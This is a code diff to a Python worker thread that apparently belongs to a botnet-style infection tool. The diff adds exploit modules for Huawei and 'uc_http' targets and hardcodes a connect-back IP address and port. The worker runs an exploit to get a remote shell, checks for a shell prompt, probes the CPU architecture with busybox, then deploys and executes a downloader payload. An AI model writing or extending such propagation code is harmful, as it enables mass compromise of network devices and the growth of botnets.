@@ -1,4 +1,5 @@
 import threading
+import time
 
 from util_connection import *
 
@@ -10,8 +11,9 @@ class Worker(threading.Thread):
         self.attack_type = attack_type
         self.get_payload_cb = get_payload_cb
 
-        self.connect_back_ip = None
-        self.connect_back_port = None
+        # Get localhost ip = ip public
+        self.connect_back_ip = "95.179.152.63"
+        self.connect_back_port = 7777
         self.username = None
         self.password = None
         self.hex_payloads = []
@@ -21,6 +23,13 @@ class Worker(threading.Thread):
         if self.attack_type == "myvmware":
             from exploits.exploit4myvm import exploit_func as ex_func
             self.exploit_func = ex_func
+        if self.attack_type == "uc_http":
+            from exploits.exploit_generator import exploit_func as ex_func
+            # from exploits.exploit4myvm import exploit_func as ex_func
+            self.exploit_func = ex_func
+        if self.attack_type == "huawei":
+            from exploits.exploit_huawei import exploit_func as ex_func
+            self.exploit_func = ex_func
 
         # TODO: Select attack vector from attack_type
         pass
@@ -29,27 +38,30 @@ class Worker(threading.Thread):
         # TODO: Start attack vector, get result include shell (by socket)
         conn = self.exploit_func(self.target_ip, self.target_port)
         print("Create conn done")
-        # Deploy dlr
+        time.sleep(3)
+        conn.send("/bin/echo $\n")
 
+        # Deploy dlr
         state = 0
         payload_pos = 0
         ret = -1
         while True:
             rdbuff = conn.recv(1024)
-            if len(rdbuff) != -1:
+            if len(rdbuff) != 0:
                 pass
 
             # Setup states machine
             if state == 0 and (':' in rdbuff or '>' in rdbuff or '$' in rdbuff or '#' in rdbuff or '%' in rdbuff):
                 # TODO: Check writeable dir
+                print("Got shell")
                 state += 1
                 conn.send(TOKEN_QUERY)
             elif state == 1:
-                # TODO: Check writeable dir and check arch
+                # TODO: Consume writeable dir and check arch
                 if connection_consume(rdbuff):
                     state += 1
                 conn.send("/bin/busybox cat /bin/echo\n")
-                conn.send(TOKEN_QUERY)
+                # conn.send(TOKEN_QUERY)
             elif state == 2:
                 # Consume arch
                 if self.arch is None:
@@ -58,6 +70,8 @@ class Worker(threading.Thread):
                     if self.arch == "Unknown":
                         # TODO: Move state to exit
                         pass
+                    time.sleep(3)
+                    conn.send(TOKEN_QUERY)
                 else:
                     if connection_consume(rdbuff):
                         state += 1
@@ -77,5 +91,7 @@ class Worker(threading.Thread):
             elif state == 4:
                 if connection_consume(rdbuff):
                     print("Send dlr done, execute dlr")
+                    break
 
+        conn.close()
         pass
